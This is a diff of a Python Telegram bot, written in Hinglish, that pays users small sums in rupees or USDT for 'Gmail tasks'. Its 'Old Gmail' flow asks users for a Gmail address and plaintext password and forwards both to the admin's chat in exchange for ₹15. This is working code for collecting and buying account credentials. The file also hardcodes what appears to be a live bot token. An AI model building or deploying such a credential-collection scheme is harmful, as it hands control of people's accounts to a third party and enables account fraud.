@@ -3,7 +3,6 @@ from telebot.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMar
 import sqlite3
 import datetime
 import time
-import re
 
 # --- CONFIGURATION ---
 TOKEN = '8683212510:AAEdE8kq5-5GuKerfPa_Mzaxovgb-J5VU4w'
@@ -75,10 +74,8 @@ def main_menu(user_id):
 @bot.message_handler(commands=['start'])
 def send_welcome(message):
     user_id = message.chat.id
-    
     cursor.execute("SELECT user_id FROM users WHERE user_id=?", (user_id,))
     is_new = cursor.fetchone() is None
-    
     get_balance(user_id) 
     
     if is_new and user_id != ADMIN_ID:
@@ -92,7 +89,7 @@ def send_welcome(message):
            f"👇 <b>Niche diye gaye buttons se apna task shuru karein:</b>")
     bot.send_message(user_id, msg, parse_mode="HTML", reply_markup=main_menu(user_id))
 
-# --- BUTTON CLICKS HANDLER ---
+# --- TEXT MESSAGES HANDLER ---
 @bot.message_handler(func=lambda message: message.content_type == 'text')
 def handle_text(message):
     user_id = message.chat.id
@@ -201,10 +198,8 @@ def handle_text(message):
     elif user_id in user_states:
         state_data = user_states[user_id]
         
-        # Old Gmail Task - Step 1: Email Validation Check
         if state_data['state'] == 'old_gmail_email':
             gmail_email = text.strip()
-            # Format validation: must contain '@' and end with 'gmail.com'
             if "@" not in gmail_email or not gmail_email.endswith("@gmail.com"):
                 bot.send_message(user_id, "❌ *Invalid Gmail Format!*\nKripya sahi format me gmail bhejein (Jaise: `yourname@gmail.com`). Dobara type karein:")
                 return
@@ -214,12 +209,11 @@ def handle_text(message):
             markup.add(InlineKeyboardButton("🔙 Back to Main", callback_data="back_to_main"))
             bot.send_message(user_id, f"✅ Email saved: <code>{gmail_email}</code>\n\n👉 Ab iska <b>Password</b> bhejein:", parse_mode="HTML", reply_markup=markup)
 
-        # Old Gmail Task - Step 2: Password received, submit to Admin
         elif state_data['state'] == 'old_gmail_password':
             gmail_pass = text.strip()
             gmail_email = state_data['gmail_email']
             
-            bot.send_message(user_id, "✅ *Old Gmail Submitted!*\nAapka task Admin ke paas bhej diya gaya hai. Check hone ke baad reward add ho jayega.", parse_mode="Markdown", reply_markup=main_menu(user_id))
+            bot.send_message(user_id, "✅ *Old Gmail Submitted!*\nAapka task Admin ke paas bhej diya gaya hai.", parse_mode="Markdown", reply_markup=main_menu(user_id))
             
             markup = InlineKeyboardMarkup()
             markup.row(InlineKeyboardButton("✅ Approve", callback_data=f"oldappr_{user_id}"),
@@ -232,7 +226,6 @@ def handle_text(message):
             bot.send_message(ADMIN_ID, admin_msg, parse_mode="HTML", reply_markup=markup)
             del user_states[user_id]
 
-        # Withdraw Amount
         elif state_data['state'] == 'withdraw_amount':
             try:
                 input_val = float(text)
@@ -243,15 +236,15 @@ def handle_text(message):
                     amount_inr = input_val
                     min_val = 15.0
                     if amount_inr < min_val or amount_inr > balance_inr:
-                        bot.send_message(user_id, "❌ *Invalid Amount!* Ya toh balance kam hai ya minimum limit (₹15) cross nahi hui.", parse_mode="Markdown", reply_markup=main_menu(user_id))
+                        bot.send_message(user_id, "❌ *Invalid Amount!* Balance kam hai ya limit cross nahi hui.", parse_mode="Markdown", reply_markup=main_menu(user_id))
                         del user_states[user_id]
                         return
-                else: # USDT
+                else: 
                     amount_usd = input_val
                     amount_inr = amount_usd * USDT_TO_INR_RATE
                     min_val = 0.16
                     if amount_usd < min_val or amount_inr > balance_inr:
-                        bot.send_message(user_id, "❌ *Invalid Amount!* Ya toh balance kam hai ya minimum limit ($0.16) cross nahi hui.", parse_mode="Markdown", reply_markup=main_menu(user_id))
+                        bot.send_message(user_id, "❌ *Invalid Amount!* Balance kam hai ya limit cross nahi hui.", parse_mode="Markdown", reply_markup=main_menu(user_id))
                         del user_states[user_id]
                         return
 
@@ -267,19 +260,16 @@ def handle_text(message):
                 bot.send_message(user_id, "❌ Sirf numbers mein amount likhein.", parse_mode="Markdown", reply_markup=main_menu(user_id))
                 del user_states[user_id]
 
-        # Withdraw Address with Format Validations
         elif state_data['state'] == 'withdraw_address':
             address = text.strip()
             method = state_data['method']
             
-            # UPI Format Validation (Must contain '@')
             if method == "🏦 UPI" and "@" not in address:
-                bot.send_message(user_id, "❌ *Invalid UPI ID!*\nSahi UPI ID dalein jisme '@' ho (Jaise: `paytm@paytm` ya `ybl@oksbi`). Dobara bhejein:")
+                bot.send_message(user_id, "❌ *Invalid UPI ID!*\nSahi UPI ID dalein jisme '@' ho. Dobara bhejein:")
                 return
                 
-            # USDT/BEP20 Format Validation (Must start with '0x' or be valid length)
             if method == "🪙 USDT" and (not address.startswith("0x") or len(address) < 30):
-                bot.send_message(user_id, "❌ *Invalid USDT Address!*\nUSDT (BEP20/TRC20) address '0x' se start hona chahiye aur valid hona chahiye. Dobara bhejein:")
+                bot.send_message(user_id, "❌ *Invalid USDT Address!*\nAddress '0x' se start hona chahiye. Dobara bhejein:")
                 return
 
             amount_inr = state_data['amount_inr']
@@ -291,7 +281,7 @@ def handle_text(message):
             pending_id = cursor.lastrowid
             conn.commit()
             
-            bot.send_message(user_id, "✅ *Request Submitted!*\nAapka withdrawal request Admin ko bhej diya gaya hai. Approve hone par payment mil jayegi.", parse_mode="Markdown", reply_markup=main_menu(user_id))
+            bot.send_message(user_id, "✅ *Request Submitted!*\nAapka withdrawal request Admin ko bhej diya gaya hai.", parse_mode="Markdown", reply_markup=main_menu(user_id))
             
             markup = InlineKeyboardMarkup()
             markup.row(InlineKeyboardButton("✅ Approve", callback_data=f"apprw_{pending_id}"),
@@ -306,39 +296,36 @@ def handle_text(message):
             bot.send_message(ADMIN_ID, admin_msg, parse_mode="HTML", reply_markup=markup)
             del user_states[user_id]
 
-        # Admin Add Balance Step 1
         elif state_data['state'] == 'admin_wait_uid' and user_id == ADMIN_ID:
             try:
                 target_uid = int(text)
                 user_states[user_id] = {'state': 'admin_wait_amt', 'target_uid': target_uid}
                 bot.send_message(user_id, f"✅ User ID saved: `{target_uid}`\n\n👉 Ab *Amount (in ₹)* likhein jo add karna hai:", parse_mode="Markdown")
             except ValueError:
-                bot.send_message(user_id, "❌ User ID number format mein hona chahiye. Wapas try karein.", parse_mode="Markdown", reply_markup=main_menu(user_id))
+                bot.send_message(user_id, "❌ User ID number format mein hona chahiye.", parse_mode="Markdown", reply_markup=main_menu(user_id))
                 del user_states[user_id]
 
-        # Admin Add Balance Step 2
         elif state_data['state'] == 'admin_wait_amt' and user_id == ADMIN_ID:
             try:
                 amount = float(text)
                 target_uid = state_data['target_uid']
                 add_balance(target_uid, amount, "Bonus / Admin Added Balance")
                 
-                bot.send_message(user_id, f"✅ **Success!** ₹{amount} has been added to user `{target_uid}`.", parse_mode="Markdown", reply_markup=main_menu(user_id))
+                bot.send_message(user_id, f"✅ **Success!** ₹{amount} added to user `{target_uid}`.", parse_mode="Markdown", reply_markup=main_menu(user_id))
                 try:
-                    bot.send_message(target_uid, f"🎉 *Congratulations!*\nAdmin has added ₹{amount} to your wallet! Check your balance.", parse_mode="Markdown")
+                    bot.send_message(target_uid, f"🎉 *Congratulations!*\nAdmin has added ₹{amount} to your wallet!", parse_mode="Markdown")
                 except:
                     pass 
                 del user_states[user_id]
             except ValueError:
-                bot.send_message(user_id, "❌ Amount number hona chahiye. Failed.", parse_mode="Markdown", reply_markup=main_menu(user_id))
+                bot.send_message(user_id, "❌ Amount number hona chahiye.", parse_mode="Markdown", reply_markup=main_menu(user_id))
                 del user_states[user_id]
 
-# --- BROADCAST MEDIA HANDLER ---
+# --- MEDIA & SCREENSHOT HANDLER ---
 @bot.message_handler(content_types=['text', 'photo', 'video', 'document'])
 def handle_all_media(message):
     user_id = message.chat.id
     
-    # Check if user is sending screenshot for Gmail Task
     if user_id in user_states and user_states[user_id].get('state') == 'waiting_for_screenshot':
         if message.content_type == 'photo':
             file_id = message.photo[-1].file_id
@@ -347,19 +334,18 @@ def handle_all_media(message):
             markup.row(InlineKeyboardButton("✅ Approve", callback_data=f"apprt_{user_id}"),
                        InlineKeyboardButton("❌ Reject", callback_data=f"rejct_{user_id}"))
             
-            admin_msg = f"🔔 <b>NEW GMAIL TASK SUBMISSION</b>\n\n👤 <b>User ID:</b> <code>{user_id}</code>\n\nPlease check screenshot and approve/reject."
+            admin_msg = f"🔔 <b>NEW GMAIL TASK SUBMISSION</b>\n\n👤 <b>User ID:</b> <code>{user_id}</code>\n\nPlease check screenshot."
             bot.send_photo(ADMIN_ID, file_id, caption=admin_msg, parse_mode="HTML", reply_markup=markup)
             
-            bot.send_message(user_id, "✅ *Proof Submitted!*\nAapka screenshot Admin ko bhej diya gaya hai. Approve hote hi ₹15 aapke wallet me add ho jayenge.", parse_mode="Markdown", reply_markup=main_menu(user_id))
+            bot.send_message(user_id, "✅ *Proof Submitted!*\nAapka screenshot Admin ko bhej diya gaya hai.", parse_mode="Markdown", reply_markup=main_menu(user_id))
             del user_states[user_id]
             return
         else:
             bot.send_message(user_id, "❌ Kripya valid **Screenshot (Photo)** bhejein!")
             return
 
-    # Broadcast Mode for Admin
     if user_id in user_states and user_states[user_id].get('state') == 'admin_wait_broadcast' and user_id == ADMIN_ID:
-        bot.send_message(user_id, "⏳ *Broadcast Started...* Please wait.", parse_mode="Markdown")
+        bot.send_message(user_id, "⏳ *Broadcast Started...*", parse_mode="Markdown")
         users = get_all_users()
         success = 0
         failed = 0
@@ -372,19 +358,20 @@ def handle_all_media(message):
             except Exception:
                 failed += 1
                 
-        bot.send_message(user_id, f"✅ *Broadcast Complete!*\n\n🚀 Successfully sent to: {success}\n❌ Failed (Blocked bot): {failed}", parse_mode="Markdown", reply_markup=main_menu(user_id))
+        bot.send_message(user_id, f"✅ *Broadcast Complete!*\n🚀 Sent: {success} | ❌ Failed: {failed}", parse_mode="Markdown", reply_markup=main_menu(user_id))
         del user_states[user_id]
         return
 
     if message.content_type == 'text':
         handle_text(message)
 
-# --- CALLBACK QUERIES (Inline Buttons) ---
+# --- SECURE CALLBACK QUERIES (Preventing Double-Click & Bugs) ---
 @bot.callback_query_handler(func=lambda call: True)
 def callback_query(call):
     user_id = call.message.chat.id
+    data = call.data
 
-    if call.data == "back_to_main":
+    if data == "back_to_main":
         if user_id in user_states:
             del user_states[user_id]
         try:
@@ -393,89 +380,100 @@ def callback_query(call):
             pass
         bot.send_message(user_id, "🏠 *Main Menu*", parse_mode="Markdown", reply_markup=main_menu(user_id))
 
-    elif call.data == "task_done":
+    elif data == "task_done":
         markup = InlineKeyboardMarkup()
         markup.add(InlineKeyboardButton("🔙 Back to Main", callback_data="back_to_main"))
         bot.send_message(user_id, "📸 Kripya task complete karne ke baad **Screenshot (Photo)** bhejein:", parse_mode="Markdown", reply_markup=markup)
         user_states[user_id] = {'state': 'waiting_for_screenshot'}
 
-    elif call.data == "admin_total_users" and user_id == ADMIN_ID:
+    elif data == "admin_total_users" and user_id == ADMIN_ID:
         users = get_all_users()
         total = len(users)
         bot.answer_callback_query(call.id, f"Total Users: {total}", show_alert=True)
 
-    elif call.data == "admin_broadcast" and user_id == ADMIN_ID:
+    elif data == "admin_broadcast" and user_id == ADMIN_ID:
         markup = InlineKeyboardMarkup()
         markup.add(InlineKeyboardButton("🔙 Back to Main", callback_data="back_to_main"))
-        bot.send_message(user_id, "📢 *Broadcast Mode*\n\nJo message aap sabko bhejna chahte hain, wo mujhe bhejein (Text, Photo ya Video kuch bhi).", parse_mode="Markdown", reply_markup=markup)
+        bot.send_message(user_id, "📢 *Broadcast Mode*\n\nJo message sabko bhejna hai, wo bhejein:", parse_mode="Markdown", reply_markup=markup)
         user_states[user_id] = {'state': 'admin_wait_broadcast'}
 
-    elif call.data == "admin_addbal" and user_id == ADMIN_ID:
+    elif data == "admin_addbal" and user_id == ADMIN_ID:
         markup = InlineKeyboardMarkup()
         markup.add(InlineKeyboardButton("🔙 Back to Main", callback_data="back_to_main"))
-        bot.send_message(user_id, "💸 *Add Balance Mode*\n\n👉 Kripya us user ka *Telegram ID* bhejein jisme paise add karne hain:", parse_mode="Markdown", reply_markup=markup)
+        bot.send_message(user_id, "💸 *Add Balance Mode*\n\n👉 User ka *Telegram ID* bhejein:", parse_mode="Markdown", reply_markup=markup)
         user_states[user_id] = {'state': 'admin_wait_uid'}
 
-    elif call.data.startswith("oldappr_"):
-        target_user = int(call.data.split("_")[1])
+    # --- SECURED TASK & WITHDRAW APPROVAL/REJECTION ---
+    elif data.startswith("oldappr_"):
+        target_user = int(data.split("_")[1])
+        bot.answer_callback_query(call.id, "Processing...")
         add_balance(target_user, 15.0, "Old Gmail Task Approved")
         try:
             bot.send_message(target_user, "🎉 *Old Gmail Approved!*\n₹15 aapke Wallet me add kar diye gaye hain.", parse_mode="Markdown")
         except: pass
-        bot.edit_message_text(f"✅ Old Gmail Approved for `{target_user}`", call.message.chat.id, call.message.message_id, parse_mode="Markdown")
+        bot.edit_message_text(f"✅ Old Gmail Approved for <code>{target_user}</code> (Done)", call.message.chat.id, call.message.message_id, parse_mode="HTML")
 
-    elif call.data.startswith("oldrej_"):
-        target_user = int(call.data.split("_")[1])
+    elif data.startswith("oldrej_"):
+        target_user = int(data.split("_")[1])
+        bot.answer_callback_query(call.id, "Processing...")
         try:
             bot.send_message(target_user, "❌ *Old Gmail Rejected!*\nAapka Old Gmail task reject kar diya gaya hai.", parse_mode="Markdown")
         except: pass
-        bot.edit_message_text(f"❌ Old Gmail Rejected for `{target_user}`", call.message.chat.id, call.message.message_id, parse_mode="Markdown")
+        bot.edit_message_text(f"❌ Old Gmail Rejected for <code>{target_user}</code> (Done)", call.message.chat.id, call.message.message_id, parse_mode="HTML")
 
-    elif call.data.startswith("apprt_"): 
-        target_user = int(call.data.split("_")[1])
+    elif data.startswith("apprt_"): 
+        target_user = int(data.split("_")[1])
+        bot.answer_callback_query(call.id, "Processing...")
         add_balance(target_user, 15.0, "Gmail Task Approved")
         try:
             bot.send_message(target_user, "🎉 *Task Approved!*\n₹15 aapke Wallet me add kar diye gaye hain.", parse_mode="Markdown")
         except: pass
-        bot.edit_message_text(f"✅ Task Approved for `{target_user}`", call.message.chat.id, call.message.message_id, parse_mode="Markdown")
+        bot.edit_message_text(f"✅ Task Approved for <code>{target_user}</code> (Done)", call.message.chat.id, call.message.message_id, parse_mode="HTML")
 
-    elif call.data.startswith("rejct_"): 
-        target_user = int(call.data.split("_")[1])
+    elif data.startswith("rejct_"): 
+        target_user = int(data.split("_")[1])
+        bot.answer_callback_query(call.id, "Processing...")
         try:
-            bot.send_message(target_user, "❌ *Task Rejected!*\nAapka Gmail Task reject kar diya gaya hai. Kripya rules dhyaan se padhein.", parse_mode="Markdown")
+            bot.send_message(target_user, "❌ *Task Rejected!*\nAapka Gmail Task reject kar diya gaya hai.", parse_mode="Markdown")
         except: pass
-        bot.edit_message_text(f"❌ Task Rejected for `{target_user}`", call.message.chat.id, call.message.message_id, parse_mode="Markdown")
+        bot.edit_message_text(f"❌ Task Rejected for <code>{target_user}</code> (Done)", call.message.chat.id, call.message.message_id, parse_mode="HTML")
 
-    elif call.data.startswith("apprw_"): 
-        pending_id = int(call.data.split("_")[1])
+    elif data.startswith("apprw_"): 
+        pending_id = int(data.split("_")[1])
         cursor.execute("SELECT user_id, amount, method FROM pending_withdraws WHERE id=?", (pending_id,))
         req = cursor.fetchone()
         if req:
             target_user, display_amount, method = req
             curr_symbol = "₹" if method == "🏦 UPI" else "$"
+            bot.answer_callback_query(call.id, "Processing...")
             try:
-                bot.send_message(target_user, f"🎉 *Payment Sent!*\nAapka {method} withdrawal of {curr_symbol}{display_amount} successful ho gaya hai. Check your account!", parse_mode="Markdown")
+                bot.send_message(target_user, f"🎉 *Payment Sent!*\nAapka {method} withdrawal of {curr_symbol}{display_amount} successful ho gaya hai!", parse_mode="Markdown")
             except: pass
-            bot.edit_message_text(f"✅ Withdrawal Approved for `{target_user}`", call.message.chat.id, call.message.message_id, parse_mode="Markdown")
+            bot.edit_message_text(f"✅ Withdrawal Approved for <code>{target_user}</code> (Done)", call.message.chat.id, call.message.message_id, parse_mode="HTML")
             cursor.execute("DELETE FROM pending_withdraws WHERE id=?", (pending_id,))
             conn.commit()
+        else:
+            bot.answer_callback_query(call.id, "⚠️ Already processed or invalid request!", show_alert=True)
 
-    elif call.data.startswith("rejcc_"): 
-        pending_id = int(call.data.split("_")[1])
+    elif data.startswith("rejcc_"): 
+        pending_id = int(data.split("_")[1])
         cursor.execute("SELECT user_id, amount, method FROM pending_withdraws WHERE id=?", (pending_id,))
         req = cursor.fetchone()
         if req:
             target_user, display_amount, method = req
             refund_inr = display_amount if method == "🏦 UPI" else display_amount * USDT_TO_INR_RATE
             
+            bot.answer_callback_query(call.id, "Processing...")
             add_balance(target_user, refund_inr, f"Refund: {method} Withdraw Rejected")
             try:
-                bot.send_message(target_user, f"❌ *Withdrawal Rejected!*\nAapka {method} withdrawal admin dwara reject kar diya gaya hai. Balance wallet me wapas add ho gaya hai.", parse_mode="Markdown")
+                bot.send_message(target_user, f"❌ *Withdrawal Rejected!*\nAapka {method} withdrawal reject ho gaya hai. Balance wallet me refund ho gaya hai.", parse_mode="Markdown")
             except: pass
-            bot.edit_message_text(f"❌ Withdrawal Rejected for `{target_user}` (Refunded)", call.message.chat.id, call.message.message_id, parse_mode="Markdown")
+            bot.edit_message_text(f"❌ Withdrawal Rejected for <code>{target_user}</code> (Refunded)", call.message.chat.id, call.message.message_id, parse_mode="HTML")
             cursor.execute("DELETE FROM pending_withdraws WHERE id=?", (pending_id,))
             conn.commit()
+        else:
+            bot.answer_callback_query(call.id, "⚠️ Already processed or invalid request!", show_alert=True)
 
 # --- START BOT ---
-print("Bot with Strict Format Validation is running smoothly...")
+print("Bot with Fixed Double-Click & Secure Approvals is running...")
 bot.polling(none_stop=True)
